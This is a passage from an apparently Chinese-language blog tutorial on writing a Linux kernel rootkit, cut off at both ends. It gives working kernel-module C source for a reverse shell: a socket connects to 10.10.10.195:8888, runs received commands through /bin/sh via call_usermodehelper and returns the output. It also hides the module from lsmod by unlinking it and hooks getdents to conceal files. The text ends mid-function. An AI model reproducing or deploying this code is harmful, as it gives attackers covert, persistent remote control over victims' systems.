class="string">&quot;Goodbye, world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(example_init);</span><br><span class="line">module_exit(example_exit);</span><br></pre></td></tr></table></figure>

<p>   <strong>5、linux kernel module可通过<code>make modules</code>命令编译，例如本篇编译的<code>Makefile</code>文件如下所示：</strong>  </p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += rootkit.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>   <strong>5、linux kernel module使用命令<code>insmod</code>加载，使用<code>rmmod</code>命令卸载，可以使用<code>lsmod</code>命令查看所有已经加载的linux kernel module。上面的linux kernel module运行结果如下图所示：</strong>  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/1.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/2.png">  </p>
<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/3.png">  </p>
<hr>
<h1 id="四、hook系统调用表"><a href="#四、hook系统调用表" class="headerlink" title="四、hook系统调用表"></a>四、hook系统调用表</h1><p>   <strong>1、系统调用表（System call Table），是一张由指向实现各种系统调用的内核函数的函数指针组成的表，该表可以基于系统调用编号进行索引，来定位函数地址，完成系统调用(PS: 来自百度百科)，系统调用表详细列表如下链接所示：</strong>  </p>
<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p>
<p>   <strong>2、系统调用表的hook一般可以通过以下几种方式来实现：</strong>  </p>
<ul>
<li><p>找到系统调用表位置，修改系统调用表中的函数地址</p>
</li>
<li><p>找到系统调用表位置，修改系统调用表函数前几个字节做一个jmp，就是inlinehook，当然可以在汇编上直接替换掉系统调用表的函数二进制指令</p>
</li>
<li><p>利用别人写好的框架，例如ftrace(PS:本文为了方便，即利用此方式)</p>
<p> <strong>3、获取系统调用表地址一般也可以通过以下几种方式来实现</strong>  </p>
</li>
<li><p>通过调用函数kallsyms_lookup_name获取(ps:高版本已经被禁用该函数)</p>
</li>
<li><p>扫描内存，匹配特征码来找到系统调用表的地址</p>
</li>
<li><p>读取&#x2F;proc&#x2F;kallsym文件来获取</p>
</li>
<li><p>其他方法，不在过多介绍</p>
<p> <strong>4、linux kernel rootkit中的某些功能需要通过hook系统调用表的函数来实现，例如监控命令的执行等</strong></p>
</li>
</ul>
<hr>
<h1 id="五、linux-kernel多线程"><a href="#五、linux-kernel多线程" class="headerlink" title="五、linux kernel多线程"></a>五、linux kernel多线程</h1><p>   <strong>1、linux kernel中的多线程可使用宏定义<code>kthread_run</code>来创建一个内核线程，第一个参数为线程要执行的函数名，使用<code>kthread_stop</code>来停止</strong>  </p>
<p>   <strong>2、一个简单的多线程示例如下所示：(PS: 这里不用导入那么多头文件，之所以使用这么多头文件，是使用了其他API)</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/namei.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">test_kthread</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kthread_test_func</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> __init <span class="type">int</span> <span class="title function_">kthread_test_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	test_kthread = kthread_run(kthread_test_func, <span class="literal">NULL</span>, <span class="string">&quot;kthread-test&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!test_kthread) &#123;</span><br><span class="line">		<span class="keyword">return</span> -ECHILD;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> __exit <span class="type">void</span> <span class="title function_">kthread_test_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(kthread_test_init);</span><br><span class="line">module_exit(kthread_test_exit);</span><br></pre></td></tr></table></figure>

<h1 id="六、linux-kernel-socket"><a href="#六、linux-kernel-socket" class="headerlink" title="六、linux kernel socket"></a>六、linux kernel socket</h1><p>   <strong>1、linux内核中的通信和用户层面的步骤差不多，都是先创建socket、连接或监听socket、调用函数收发信息、关闭连接</strong>  </p>
<p>   <strong>2、不同点在于调用的API不同，linux内核中调用的是<code>sock_create_kern</code>函数来创建socket，调用<code>sock-&gt;ops-&gt;connect</code>来连接服务端(PS:这里的sock是前面创建的socket连接符)，调用<code>kernel_sendmsg</code>来发送信息，调用<code>kernel_recvmsg</code>来接收信息，调用<code>kernel_sock_shutdown</code>函数来关闭连接，调用<code>sock_release</code>函数来释放socket连接符，按照用户层的socket的流程来调用即可</strong>  </p>
<p>   <strong>3、上面的api不是唯一的，linux源码中还提供了其他的函数来实现socket连接，感兴趣的可以去查阅相关的linux源码</strong>  </p>
<p>   <strong>4、上面只写了socket客户端，不写socket服务端的原因是作者测试了好几套api在5.4的内核版本中，都运行到某个阶段内核就挂了，知道原因的大佬可以指出是什么原因</strong>  </p>
<p>   <strong>5、测试用例如下所示：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">myserver</span><span class="params">(<span class="type">void</span> *data)</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>,*<span class="title">client_sock</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">s_addr</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> portnum=<span class="number">8888</span>;</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> recvbuf[<span class="number">1024</span>];</span><br><span class="line">	<span class="type">char</span> sendbuf[<span class="number">4096</span>];</span><br><span class="line">	<span class="type">char</span> *result;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">recvmsg</span>,<span class="title">sendmsg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kvec</span> <span class="title">send_vec</span>,<span class="title">recv_vec</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//sendbuf = kmalloc(1024,GFP_KERNEL);</span></span><br><span class="line">	<span class="keyword">if</span>(sendbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: sendbuf kmalloc failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//recvbuf = kmalloc(1024,GFP_KERNEL);</span></span><br><span class="line">	<span class="keyword">if</span>(recvbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: recvbuf kmalloc failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(s_addr));</span><br><span class="line">        s_addr.sin_family=AF_INET;</span><br><span class="line">        s_addr.sin_port=htons(portnum);</span><br><span class="line">        s_addr.sin_addr.s_addr=in_aton(<span class="string">&quot;10.10.10.195&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        sock=(<span class="keyword">struct</span> socket *)kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> socket),GFP_KERNEL);</span><br><span class="line">        client_sock=(<span class="keyword">struct</span> socket *)kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> socket),GFP_KERNEL);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*create a socket*/</span></span><br><span class="line">        ret=sock_create_kern(&amp;init_net,AF_INET, SOCK_STREAM,<span class="number">0</span>,&amp;sock);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                printk(<span class="string">&quot;[SockTest]:socket_create_kern error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(<span class="string">&quot;[SockTest]:socket_create_kern ok!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*connect the socket*/</span></span><br><span class="line">        ret=sock-&gt;ops-&gt;connect(sock,(<span class="keyword">struct</span> sockaddr *)&amp;s_addr,<span class="keyword">sizeof</span>(s_addr),<span class="number">0</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: connect ret = %d\n&quot;</span>,ret);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">        if(ret != 0)&#123;</span></span><br><span class="line"><span class="comment">                printk(&quot;[SockTest]: connect error\n&quot;);</span></span><br><span class="line"><span class="comment">                return ret;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">        printk(<span class="string">&quot;[SockTest]:connect ok!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(sendbuf,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcpy</span>(sendbuf,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sendmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(sendmsg));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;send_vec,<span class="number">0</span>,<span class="keyword">sizeof</span>(send_vec));</span><br><span class="line"></span><br><span class="line">	send_vec.iov_base = sendbuf;</span><br><span class="line">	send_vec.iov_len = <span class="number">4096</span>;	</span><br><span class="line">	</span><br><span class="line">        <span class="comment">/*send*/</span></span><br><span class="line">	ret = kernel_sendmsg(sock,&amp;sendmsg,&amp;send_vec,<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: kernel_sendmsg ret = %d\n&quot;</span>,ret);</span><br><span class="line">	<span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: kernel_sendmsg failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: send ok!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(&amp;recv_vec,<span class="number">0</span>,<span class="keyword">sizeof</span>(recv_vec));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;recvmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(recvmsg));</span><br><span class="line"></span><br><span class="line">	recv_vec.iov_base = recvbuf;</span><br><span class="line">	recv_vec.iov_len = <span class="number">1024</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*kmalloc a receive buffer*/</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(recvbuf, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">		ret = kernel_recvmsg(sock,&amp;recvmsg,&amp;recv_vec,<span class="number">1</span>,<span class="number">1024</span>,<span class="number">0</span>);</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: received message: %s\n&quot;</span>,recvbuf);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;exit&quot;</span>,recvbuf)) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: %ld\n&quot;</span>,<span class="built_in">strlen</span>(recvbuf));</span><br><span class="line">		result = execcmd(recvbuf);</span><br><span class="line">		<span class="built_in">memset</span>(sendbuf,<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">		<span class="built_in">strncpy</span>(sendbuf,result,<span class="number">4096</span>);</span><br><span class="line">		ret = kernel_sendmsg(sock,&amp;sendmsg,&amp;send_vec,<span class="number">1</span>,<span class="built_in">strlen</span>(sendbuf));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kernel_sock_shutdown(sock,SHUT_RDWR);</span><br><span class="line">	sock_release(sock);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: socket exit\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="七、linux-kernel命令执行"><a href="#七、linux-kernel命令执行" class="headerlink" title="七、linux kernel命令执行"></a>七、linux kernel命令执行</h1><p>   <strong>1、对于一个rootkit来说，最核心的功能点肯定在于能够执行命令</strong>  </p>
<p>   <strong>2、在linux内核中，有以下几种方式可以用来执行命令：</strong>  </p>
<ul>
<li><p>hook系统调用表，劫持命令执行函数sys_execve</p>
</li>
<li><p>调用call_usermodehelper函数直接执行命令</p>
<p> <strong>3、这里使用的是第二种方式来执行命令，第一种只做到了无参数命令执行，对于有参数的解析其参数时按照指针数组解析出来的不知道为啥一直是乱码，知道原因的大佬可以指教以下</strong>  </p>
<p> <strong>4、无论是什么方式，都无法将命令回显结果直接写入内存直接读取，所以这里采用的是将命令结果利用<code>&gt;</code>写入某个文件中，然后调用<code>vfs_read</code>函数读取文件获取命令回显，如下所示：</strong></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span>* <span class="title function_">execcmd</span><span class="params">(<span class="type">char</span> cmd[<span class="number">1024</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fp</span>;</span></span><br><span class="line">	<span class="type">mm_segment_t</span> fs;</span><br><span class="line">	<span class="type">loff_t</span> pos;</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">	<span class="type">char</span> add[] = <span class="string">&quot; &gt; /tmp/result.txt&quot;</span>;</span><br><span class="line">        <span class="type">char</span> cmd_path[] = <span class="string">&quot;bin/sh&quot;</span>;</span><br><span class="line">	<span class="built_in">strcat</span>(cmd,add);</span><br><span class="line">        <span class="type">char</span> *cmd_argv[] = &#123;cmd_path,<span class="string">&quot;-c&quot;</span>,cmd,<span class="literal">NULL</span>&#125;;</span><br><span class="line">        <span class="type">char</span> *cmd_envp[] = &#123;<span class="string">&quot;HOME=/&quot;</span>,<span class="string">&quot;PATH=/sbin:/bin:/user/bin&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">        result = call_usermodehelper(cmd_path,cmd_argv,cmd_envp,UMH_WAIT_PROC);</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[TestKthread]: call_usermodehelper() result is %d\n&quot;</span>,result);</span><br><span class="line">	fp = filp_open(<span class="string">&quot;/tmp/result.txt&quot;</span>,O_RDWR | O_CREAT,<span class="number">0644</span>);</span><br><span class="line">	<span class="keyword">if</span>(IS_ERR(fp)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;open file failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">	fs = get_fs();</span><br><span class="line">	set_fs(KERNEL_DS);</span><br><span class="line">	pos = <span class="number">0</span>;</span><br><span class="line">	vfs_read(fp,buf,<span class="keyword">sizeof</span>(buf),&amp;pos);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;shell result %ld:\n&quot;</span>,<span class="built_in">strlen</span>(buf));</span><br><span class="line">	printk(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	filp_close(fp,<span class="literal">NULL</span>);</span><br><span class="line">	set_fs(fs);</span><br><span class="line">	<span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="八、隐藏内核模块自身"><a href="#八、隐藏内核模块自身" class="headerlink" title="八、隐藏内核模块自身"></a>八、隐藏内核模块自身</h1><p>   <strong>1、对于linux kernel rootkit，很重要的一点就是隐藏自己的存在，不然受害者一个<code>lsmod</code>就发现了</strong>  </p>
<p>   <strong>2、通过<code>lsmod</code>读出来的已经加载的内核模块在内存中的表现形式为一个链表，我们可以通过添加、删除这个链表中的节点来实现对内核模块的显示和隐藏</strong>  </p>
<p>   <strong>3、我们可以通过<code>THIS_MODULE</code>这个变量来访问上述的连接，幸运的是，官方提供了API 来添加和删除节点，分别为<code>list_del</code>和<code>list_add</code>函数</strong>  </p>
<p>   <strong>4、实现该功能源码如下所示：</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hideme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	prev_module = THIS_MODULE-&gt;<span class="built_in">list</span>.prev;</span><br><span class="line">	list_del(&amp;THIS_MODULE-&gt;<span class="built_in">list</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	list_add(&amp;THIS_MODULE-&gt;<span class="built_in">list</span>,prev_module);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="九、隐藏文件"><a href="#九、隐藏文件" class="headerlink" title="九、隐藏文件"></a>九、隐藏文件</h1><p>   <strong>1、由于前面的命令执行功能获取命令回显结果产生了一些文件，所以我们还要隐藏这些产生从文件来避免我们的rootkit被发现</strong>  </p>
<p>   <strong>2、我们可以通过hook <code>sys_getdents</code>系统调用来实现，该系统调用有三个参数，其中第二个参数为一个指针，该指针所存储的即为一个目录的文件和目录信息，在内存中的数据结构为一个链表，通过遍历这个链表然后删除相应的节点即可达到隐藏文件的目的</strong>  </p>
<p>   <strong>3、该链表的数据结构如下所示，其中，<code>d_name</code>为文件或目录的名称，<code>d_reclen</code>为长度，通过这两个数据，我们即可实现隐藏文件和目录的功能</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> &#123;</span></span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_ino;</span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_off;</span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">short</span> d_reclen;</span><br><span class="line">	    <span class="type">char</span> d_name[];</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>   <strong>4、该功能实现示例如下所示：</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="type">int</span> <span class="title function_">hook_getdents</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> &#123;</span></span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_ino;</span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_off;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> d_reclen;</span><br><span class="line">	    <span class="type">char</span> d_name[];</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> __<span class="title">user</span> *<span class="title">dirent</span> =</span> (<span class="keyword">struct</span> linux_dirent *)regs-&gt;si;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">current_dir</span>,*<span class="title">previous_dir</span>,*<span class="title">dirent_ker</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> offset = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> ret = orig_getdents(regs);</span><br><span class="line">	dirent_ker = kzalloc(ret, GFP_KERNEL);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ((ret &lt;= <span class="number">0</span>) || (dirent_ker == <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">&quot;error 1,ret is %d\n&quot;</span>,ret);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = copy_from_user(dirent_ker, dirent, ret);</span><br><span class="line">	<span class="keyword">if</span>(error)</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">&quot;error 2\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(offset &lt; ret)</span><br><span class="line">	&#123;</span><br><span class="line">		current_dir = (<span class="type">void</span> *)dirent_ker + offset;</span><br><span class="line">		<span class="keyword">if</span>(check(current_dir-&gt;d_name) == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(debug_mode == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				printk(KERN_DEBUG <span class="string">&quot;rootkit: Found %s\n&quot;</span>, current_dir-&gt;d_name);</span><br><span class="line">			